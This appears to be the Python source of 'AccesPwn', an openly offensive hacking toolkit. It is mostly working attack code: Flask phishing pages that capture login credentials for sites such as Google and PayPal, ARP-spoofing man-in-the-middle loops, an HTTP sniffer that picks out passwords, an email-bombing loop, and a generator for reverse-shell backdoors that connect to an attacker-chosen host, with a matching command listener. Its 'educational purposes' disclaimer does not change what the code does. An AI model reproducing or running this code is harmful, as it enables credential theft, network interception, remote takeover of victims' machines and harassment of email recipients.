#!/usr/bin/python3
#this project is coded and build by msfcode (instagram)
#Do not use it without asking persmissions
#this tool is build for educational purpose
#respect copyrights©
#the project start 12/11/2020
#if you have any idea or project 
#contact msfcode at instagram page
# https://www.instagram.com
#if you have any issues
#tag it at https://github.com/msfcode/accespwn/issues
#This tool is build using python3


#provides functions for interacting with the operating system
import os
#for debugging deadlock
import sys
#returns the number of seconds passed since epoch
import time
#provides various objects, constants, functions 
#and related exceptions for building full-fledged 
#network applications including client and server 
#programs
import socket 
#defines an SMTP client session object that can be used to send mail to any Interne
#i will use it like a tool to run an smtp server to send email  
import smtplib 
#allows you to send HTTP requests using Python
import requests
#makes it easy to write user-friendly command-line interfaces
import argparse
#allows you to spawn new processes, connect to their input/output/error pipes, 
#and obtain their return codes
import subprocess
#allows you to control and monitor input devices
import pynput.keyboard
#It can easily handle most classical tasks like scanning, tracerouting, probing, 
#unit tests, attacks or network discovery
import scapy.all as scapy
#web application framework
from flask import Flask, render_template, request
from scapy.layers import http

#the user will choose between command line interface and normal simple interface      
userInterface = input('\u001b[1muse command line or no(y/n) : ')
if userInterface == 'y':
 parser = argparse.ArgumentParser()
 #argument to start phishing attack
 #just type the website login page you want to get
 parser.add_argument('--phishing', help='phishing exemle : python3 accespwn.py --phishing google')
 parser.add_argument('--ngrok', help='Generate ngrok links E.g: python3 accespwn.py --ngrok 5000')
 parser.add_argument('--localhost', help='Generate Localhost.run links E.g: python3 accespwn.py --localhost 5000')
 print('')
 #using this argument you will be man in the middle attack
 parser.add_argument('--arp', help='MITM exemple: python3 accespwn.py --arp VictimIP --gateway YourRouterIP --mac VictimMac')
 parser.add_argument('--gateway', help='set the Router Ip')
 parser.add_argument('--mac', help='set the victim mac address')
 args = parser.parse_args()
 phishing = args.phishing
 arp = args.arp
 gateway = args.gateway
 mac = args.mac
 ngrok = args.ngrok
 localhost = args.localhost
 if args.localhost:
  def localhostrun():

          print('\u001b[31mPlease set the port to 5000 for phishing attack')

          print('')

          print('\u001b[32mjust click at enter')

          print('')

          print('\u001b[37mlaunching...')

          time.sleep(3)

          port = localhost

          subprocess.call('ssh-keygen', shell=True)

          port = str(port)

          subprocess.call('ssh -R 80:localhost:'+port+ ' localhost.run',shell=True)

#this def make easy to lauch localhostrun def
  def menu():

#coded from line 16 to 36 

   localhostrun()

  menu()
 if args.ngrok:
  def ngrokLauncher():
   port = ngrok
   port = str(port)
   ngrokChecker = input('is ngrok installed [y/n] : ')
   if ngrokChecker == 'y':
    subprocess.call('./ngrok http ' + port,shell=True)
   if ngrokChecker == 'n':
     subprocess.call('unzip ngrok-stable-linux-amd64.zip', shell=True)
     subprocess.call('./ngrok http ' + port,shell=True) 	
   else:
    print('choose between [y/n]')
  def launcher():
     try:
      ngrokLauncher()
     except:
      print('Their is an Error[contact msfcode]')
  launcher()
 if args.arp:
  print('''\u001b[37m      BE ROOT BEFORE USE IT !! 
           ▄▄▄▄
         ▄██████       ▄▄▄█▄         K1ll th3 c0nn3ct10n
       ▄██▀░░▀██▄    ████████▄              w1th accespwn
      ███░░░░░░██      █▀▀▀▀▀██▄▄               f0r fUn  
     ▄██▌░░░░░░░██    ▐▌        ▀█▄                
     ███░░▐█░█▌░██    █▌          ▌
    ████░▐█▌░▐█▌██   ██
   ▐████░▐░░░░░▌██   █▌
    ████░░░▄█░░░██  ▐█
    ████░░░██░░██▌  █▌       Or be a pr0 and uSe 1t
    ████▌░▐█░░███   █                       to b3 MITM 
    ▐████░░▌░███   ██                          and sniff users and password
    ████░░░███    █▌
    ██████▌░████   ██
 ▐████████████  ███
 █████████████▄████
██████████████████
██████████████████
█████████████████
████████████████
████████████████
AccesPwn created by
    @msfcode

 ''')
  try:
    def arpspoofing(arp, gateway):
        packet = scapy.ARP(op=2,pdst=arp, hwdst=mac, psrc=gateway)
        scapy.send(packet, verbose=False)
    count = 0
    timea = int(input('set the time to send requests: '))
    while True:
        arpspoofing(arp, gateway)
        arpspoofing(gateway, arp)
        count = count + 2
        print('\r                    send packets : ' + str(count), end='')
        time.sleep(timea)
  except:
  	print('')
  	print('')
  	print('                  \u001b[32mfollow msfcode in instagram')
  	print('')
 if args.phishing:
  app = Flask(__name__)
  @app.route('/')
  def index():
    return render_template(f'/sites/{phishing}/index.html')
  @app.route('/', methods=['POST', 'GET'])
  def getdata():
     username = request.form['username']
     password = request.form['password']
     print('\u001b[32musername : \u001b[37m' + username)
     print('\u001b[32mpassword : \u001b[37m' + password)
     return render_template('pass.html')
  if __name__ == ('__main__'):
     app.run(debug=True)
if userInterface == 'n':
 print('''\u001b[1m 
								       █████████████████████
								    ████▀─────────────────▀████
								  ███▀───────────────────────▀███
								█▀───────────────────────────────▀█
								█─────────────────────────────────█     BE ROOT
								█───█████─────────────────█████───█       BEFORE USE IT !!
								█──██▓▓▓███─────────────███▓▓▓██──█                    sudo su
								█──██▓▓▓▓▓██───────────██▓▓▓▓▓██──█
								█──██▓▓▓▓▓▓██─────────██▓▓▓▓▓▓██──█
								█▄──████▓▓▓▓██───────██▓▓▓▓████──▄█
								▀█▄───▀███▓▓▓██─────██▓▓▓███▀───▄█▀
								  █▄────▀█████▀─────▀█████▀────▄█
								 ▄██───────────▄█─█▄───────────██▄
								 ███───────────██─██───────────███
								 ███───────────────────────────███
								  ▀██──██▀██──█──█──█──██▀██──██▀
								   ▀████▀─██──█──█──█──██─▀████▀
								    ▀██▀──██──█──█──█──██──▀██▀
								          ██──█──█──█──█
								          █▄▄█▄▄█▄▄█▄▄█
                          Accespwn V2.1.1
                made the :  12/11/2020                       "\u001b[33mwhatever you believe you can achieve\u001b[37m" 
                last update : 31/05/2021                                         tony robbins
                      
                                                                       𝕮𝖔𝖉𝖊𝖉 𝖇𝖞 : 𝖒𝖘𝖋𝖈𝖔𝖉𝖊

                                                           \u001b[31mNB: This Tool is For Educational Purposes Only

                                                                \u001b[37mfollow us on : instagram.com/msfcode
                                                                 \u001b[32mhttps://github.com/msfcode/accespwn
                                                                  \u001b[33mBitcoin : 3Ak4tm8ABHHLazDp18yeioRrAWoU3Wjxum
''')
 print('')
 while True:
  try:
     start = input('\u001b[32mstart >\u001b[37m ')
     if start == 'help':
       print('''\u001b[37m 
      mac changer:     Change your MacAddress           | subfinder    Find Websites Subdomains | boomail       BOOM EMAILS 
                                                        |                                       |
      about            Get some infos about this Tool   | backdoor     Creat a windowd or Linux | link          Get Links to start
                                                        |              backdoors to control     |                to start phishing 
      exit             Exit this famous tool            |              machines                 |                   ATTACK
                                                        |                                       |
                                                        | ipweb         Get Websites Ips        |portscan       scan open ports at
      arp spoofing     MITM attack : close connection   |                                       |                   ip address
                           and be in the middle         | ipmac         Get MAC address from ip |
                                                        |                                       |
      sniffing          Sniff users & passwords         | phishing     Get accounts passwords   |
                                                                         by sending Links
''') 
     if start == 'portscan':
      def portscan():
       print('[+]Scan open ports using accespwn[+]')
       print("")
       while True:
        ip_address = input('Enter your ip address|> ')
        break
       while True:
        Min_port = int(input('Enter the min port number |> '))
        break
       while True:
        Max_port = int(input('Enter the max port number |> '))
        break
       open_ports = []
       for port in range(Min_port, Max_port):
         try:
           with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    s.connect((ip_address, port))
                    open_ports.append(port)
         except:
         	pass
       for port in open_ports:
       	print(f'port \u001b[32m {port} \u001b[37mis opened in ip: \u001b[32m' + ip_address)
      portscan() 
     if start == 'link':
#we can now port forwading ower ip to make it public 
       print(''' 
                     
                               generate some links to port forwading your Ip address to make it public

                                                   choose between  ngrok (n) and locahost.run(lr)

        ''')  
#choose between ngrok server and localhost.run server
#if you now any other port forwading server please 
#contact msfcode at instagram
#instagram.com/msfcode
       server = input('ngrok(n) or local.run(lr) : ')
       if server == 'n':
       	     from modules import ngrokaa
       	     ngrokaa.start()            
       if server == 'lr':
#importing localhostDotRun module from modules file 
       	     from modules import localhostDotRun
#start this module 
             localhostDotRun.start()
#launcing the localhost.run server 
     if start == 'phishing':
         print("""              CHOOSE BETWEEN :
                 
      adobe    create   google   instafollowers   messenger   microsoft  myspace       

      paypal   playstation    shopify   shopping  snapchat  spotify   twitch  twitter 

      wifi     wordpress  yandex

          """)
         account=input('choose from the list : ')
         portA = int(input('Enter any port |>'))
         print('\u001b[32mAfter type this command you will retry the process')
         app = Flask(__name__)
         @app.route('/')
         def index():
           return render_template(f'/sites/{account}/index.html')
         @app.route('/', methods=['POST', 'GET'])
         def getdata():
          username = request.form['username']
          password = request.form['password']
          print('\u001b[32mUSERNAME \u001b[37m: ' + username)
          print('\u001b[32mPASSWORD \u001b[37m: ' + password)
          return render_template('incorrect_password.html')
         if __name__ == ('__main__'):
           print('\u001b[31mCLICK N\u001b[0m')
           app.run(debug=True, port = portA)
           os.close()
           print('Error!!')
     if start == 'boomail':
       emailAttacker = input('Enter your email : ')
       passw0rdAttacker = input('Enter your password: ')
       victimEmail = input('Enter the victim email: ')
       messages = input('Enter your message: ')
       def emailsender(emailAttacker, passw0rdAttacker, messages):
         s3rv3r = smtplib.SMTP('smtp.gmail.com', 587)
         s3rv3r.starttls()
         s3rv3r.login(emailAttacker, passw0rdAttacker)
         s3rv3r.sendmail(emailAttacker, victimEmail, messages)
       while True:
          emailsender(emailAttacker, passw0rdAttacker, messages)  
     if start == 'ipmac':
        specificIp = input('IP: ')
        IpMac = scapy.arping(specificIp)
        print('the mac address is : \u001b[32m ' + IpMac)
      
     if start ==  'ipweb':
      ipweb = input('spcific website(y) or weblist(n): ')
      if ipweb == 'y':
        specificWebsite = input('enter website name:')
        ipwebsite = socket.gethostbyname(specificWebsite)
        print('')
        th3ip1s = '\u001b[32mthe ip address is :\u001b[37m'
        print(th3ip1s + ipwebsite)
      if ipweb == 'n':
        print('copy weblist directory from LIST file')
        weblist = input('Enter the weblist.txt :')
        with open(weblist, 'r') as line:
          for one in line:
            one = one.strip()
            ips = socket.gethostbyname(one)
            print('\u001b[32m ' + ips)
            print('')
      else:
        print('Sorry you have to choose between y and n')
     if start == 'backdoor':
       print(''' 
  _  ____________.---------.
  } |'  __________|_________|  
  /   (_)__]                    
 |    |                         
.'   .'     \u001b[32mG3t Acc3es and 0p3n any W1nd0ws w1th0ut us1ng Weapons\u001b[37m
|____]                     

https://instagram.com/msfcode      
                                windows backdoor        linux backdoor 
                                                listening

        ''')
       backdoor = input('backdoor : ')
       if backdoor == 'linux backdoor':
        LinuxBackdoorName = input('Backdoor Name : ')
        OpenBackdoorFile = open(LinuxBackdoorName+'.py', 'w')
        host = input('IP : ')
        port = input('PORT : ')
        OpenBackdoorFile.write(f"import os\nimport sys\nimport socket\nimport subprocess\nhost = '{host}'\nport = {port}\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((host, port))\nwhile True:\n  data = s.recv(10240000)\n  if data[:2].decode('windows-1252') == 'cd':\n     os.chdir(data[3:].decode('windows-1252'))\n  if len(data) > 0:\n     cmd = subprocess.Popen(data[:].decode('windows-1252'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n     output = cmd.stdout.read() + cmd.stderr.read()\n     output_str = str(output, 'windows-1252')\n     s.send(str.encode(output_str + str(os.getcwd()) + '> '))")
        OpenBackdoorFile.close()
        subprocess.call('pyinstaller ' +LinuxBackdoorName+'.py' + ' --onefile', shell=True)
        subprocess.call('rm -rf ' + LinuxBackdoorName+'.py', shell=True)
        subprocess.call('rm -rf ' + LinuxBackdoorName+'.spec', shell=True)
        subprocess.call('rm -rf build', shell=True)
        subprocess.call('rm -rf __pycache__', shell=True)
        subprocess.call('mv dist ' + LinuxBackdoorName, shell=True)
       if backdoor == 'listening':
        def socket_creator():
          global host
          global port
          global s 
          host = input('IP: ')
          port = int(input('PORT :'))
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        def listenner_creator():
          global host
          global port
          global s
          s.bind((host, port))
          s.listen(2)
        def commands_attacker(conn):
          while True:
            command_terminal = input('command > ')
            if command_terminal == 'quit()':
              break
            if command_terminal == 'quit':
              break
            if command_terminal == 'exit()':
              break
            if command_terminal == 'exit':
              break
            if len(str.encode(command_terminal)) > 0:
              conn.send(str.encode(command_terminal))
              data_received = str(conn.recv(10240000), 'utf-8')
              print(data_received)
        def connection_accept():
          conn, addr = s.accept()
          commands_attacker(conn)
        def start_menu():
          socket_creator()
          listenner_creator()
          connection_accept()
        start_menu()
       if backdoor == 'windows backdoor':
        windowsBackdoorName = input('Backdoor Name : ')
        OpenBackdoorFile = open(windowsBackdoorName+'.py', 'w')
        host = input('IP : ')
        port = input('PORT : ')
        OpenBackdoorFile.write(f"import os\nimport sys\nimport socket\nimport subprocess\nhost = '{host}'\nport = {port}\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((host, port))\nwhile True:\n  data = s.recv(10240000)\n  if data[:2].decode('windows-1252') == 'cd':\n     os.chdir(data[3:].decode('windows-1252'))\n  if len(data) > 0:\n     cmd = subprocess.Popen(data[:].decode('windows-1252'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n     output = cmd.stdout.read() + cmd.stderr.read()\n     output_str = str(output, 'windows-1252')\n     s.send(str.encode(output_str + str(os.getcwd()) + '> '))")
        OpenBackdoorFile.close()
     if start == 'phishing':
     	phishing_website()
     if start == 'subfinder':
      print('''
             ██████████
         █████░░░░░░░░█████
       ███░░░░░░░░░░░░░░░░███
     ███░░░░░░░░░░░░░░░░░░░░███
    ██░░░░░░░░░░░░░░░░░░░░░░░░██
   ██░░░░▐██████░░░░██████▌░░░░██
  ██░░░░░████████░░████████░░░░░██
 ██░░░░░▐██████████████████▌░░░░░██
██░░░░░░████████▀▀▀▀████████░░░░░░██      F1nd <|subdomains|> 1n any w3bs1t3
█░░░░░░▐█████▀──▄██▄──▀█████▌░░░░░░█
█░░░░░░█████───▐████▌───█████░░░░░░█
█░░░░░▐██████▄──▀██▀──▄██████▌░░░░░█ We build subfinder to make easy find subdomains 
█░░░░░██████████▄▄▄▄██████████░░░░░█            Also it will help Bug Hunters 
█░░░░▐███████░▐██████▌░███████▌░░░░█                and pentesters 
██░░░███████▌░░▐████▌░░▐███████░░░██
 ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
   ██░░░░░░░░░░░░░░░░░░░░░░░░░░██
    ██░░░░░░░░░░░░░░░░░░░░░░░░██
     ███░░░░░░░░░░░░░░░░░░░░███
       ███░░░░░░░░░░░░░░░░███
         █████░░░░░░░░█████
             ██████████


        ''')
      print('copy subdomain directory from LIST file')
      domain = input('enter the domain : ')
      subdomainTxt = input('enter the subdomain.txt file : ')
      subdomainFile = open(subdomainTxt)
      reader = subdomainFile.read()
      subdomains = reader.splitlines()
      for one in subdomains:
        url = f'https://{one}.{domain}'
        try:
          requests.get(url)
        except requests.ConnectionError:
          pass
        else:
          print('\u001b[32mwe found : \u001b[37m' + url)

     if start == 'sniffing':
      print('''
               ▒▒▒▒▒▒▒▒▒
         ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
       ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
      ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒      G3t Us3rs and PasSw0rds 
     ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                 from the wifi 
     ▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒
    ▒▒▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒███▒▒▒▒
   ▒▒▒▒██████▒▒▒▒▒▒▒▒▒██████▒▒▒▒           B3 MITM t0 us3 th1s attack
   ▒▒▒███▐▀███▒▒▒▒▒▒▒███▀▌███▒▒▒
   ▒▒▒██▄▐▌▄███▒▒▒▒▒███▄▐▌▄██▒▒▒
   ▒▒▒▒██▌███▒▒▒█▒█▒▒▒███▐██▒▒▒▒
  ▒▒▒▒▒▒███▒▒▒▒██▒██▒▒▒▒███▒▒▒▒▒▒
 ▒▒▒▒▒▒▒▒█▒▒▒▒██▒▒▒██▒▒▒▒█▒▒▒▒▒▒▒▒
 ▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒
 ▒▒▒▒█▒▒█▒▒▒▒██▒▒▒▒▒██▒▒▒▒█▒▒█▒▒▒▒
  ▒▒▒█▒▒█▒▒▒▒█▒██▒██▒█▒▒▒▒█▒▒█▒▒▒
   ▒█▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒█▒
     ▒▒█▒▒▒▐███████████▌▒▒▒█▒▒
      ▒▒▒▐█▀██▀███▀██▀█▌▒▒▒
       ▒▒▒▒█▐██▐███▌██▌█▒▒▒▒
       ▒▒▒▒▒▐▒▒▐▒▒▒▌▒▒▌▒▒▒▒▒
        ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
        ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ▒▒█▒█▒▒▒█▒▒▒█▒█▒▒
         ▒██▒█▒▒▒█▒▒▒█▒██▒
             AccesPwn
        ''')
      interface = input('Set the interface : ')
      def sniffing(interface):
            scapy.sniff(iface=interface, store=False, prn=sniffer_option)
      def sniffer_option(packet):
         if packet.haslayer(http.HTTPRequest):
          if packet.haslayer(scapy.Raw):
            loads = str(packet[scapy.Raw].load)
            keywords = ['users', 'user', 'usrs', 'usr', 'username', 'usernames', 'pass', 'passwords', 'password', 'passwd', 'passwds', 'nom', 'utilisateur', 'mot de passe', 'nom d utilisateur', 'User', 'Password', 'Username', 'Password']
            for keyword in keywords:
              if keyword in loads:
                 print('\u001b[32mUser and passowrd : \u001b[37m' + loads)
                 print('')
                 break
      sniffing(interface) 
     if start == 'arp spoofing':
       print('''\u001b[37m      BE ROOT BEFORE USE IT !! 
           ▄▄▄▄
         ▄██████       ▄▄▄█▄         K1ll th3 c0nn3ct10n
       ▄██▀░░▀██▄    ████████▄              w1th accespwn
      ███░░░░░░██      █▀▀▀▀▀██▄▄               f0r fUn  
     ▄██▌░░░░░░░██    ▐▌        ▀█▄                
     ███░░▐█░█▌░██    █▌          ▌
    ████░▐█▌░▐█▌██   ██
   ▐████░▐░░░░░▌██   █▌
    ████░░░▄█░░░██  ▐█
    ████░░░██░░██▌  █▌       Or be a pr0 and uSe 1t
    ████▌░▐█░░███   █                       to b3 MITM 
    ▐████░░▌░███   ██                          and sniff users and password
    ████░░░███    █▌
    ██████▌░████   ██
 ▐████████████  ███
 █████████████▄████
██████████████████
██████████████████
█████████████████
████████████████
████████████████
AccesPwn created by
    @msfcode

 ''')  
       
       ip_address = input('set victim ip address : ')
       gateway = input('set Gateway : ')
       def get_mac():
         mac = scapy.arping(ip_address)
         print(mac)
       get_mac()
       mac_adress = input('set victim MAC address : ')
       def arpspoofing(ip_address, gateway):
         packets = scapy.ARP(op=2, pdst=ip_address, hwdst=mac_adress, psrc=gateway)  
         scapy.send(packets, verbose=False) 
       count = 0
       timea = int(input('set the time to send packets : '))  
       while True:
         arpspoofing(ip_address, gateway)
         arpspoofing(gateway, ip_address)
         count = count + 2
         print('\r                    send packets : ' + str(count), end='') 
         time.sleep(timea)       
     if start == 'mac changer':
          print(''' 
          	         \u001b[37mThe Mac Address look like 00-14-22-01-23-45
          	               it's a good way to disappear
          	             You can check your Mac address by typing ifconfig in the Terminal
          	''')
          try:
           interface = input('Choose the interface(eth0/wlan0) : ')
           new_mac = input('set the new mac : ')
           subprocess.call('ifconfig ' + interface + ' down', shell=True)
           subprocess.call('ifconfig ' + interface + ' hw ether ' + new_mac, shell=True)
           subprocess.call('ifconfig ' + interface +' up', shell=True)
          except:
          	print('')
          	print('                     \u001b[31mPlease BE ROOT (sudo su)')
          	print('')
     if start == 'exit':
        break 
     if start == 'about':
        print('''\u001b[37m
        	This Tool is created by msfcode(follow in instagram ), and it's  for Educational Purpose 
        	                             DO NOT USE IT FOR EVIL 
        	                       and ask \u001b[32mpermission \u001b[37mbefore using it 

        	    You will find here a lot of Attacks types , like \u001b[32mArpSpoofing, \u001b[37mor \u001b[32mDns Spofing,\u001b[37m
        	    Sniffing Attack, Windows and Linux Backdoors,Trojan, Mac Changer, Crawler, File interceptor, Code Injector, 
        	    subdomain Finder, Port Scanner, Website Ip finder, Mac finder...


        	                                          DO NOT FORGET TRY TO HELP ME TO CONTINUE 
        	                                          By sharing this tool:


        	                                     \u001b[32mhttps://github.com/msfcode/accespwn
        	''')
  except:
    break
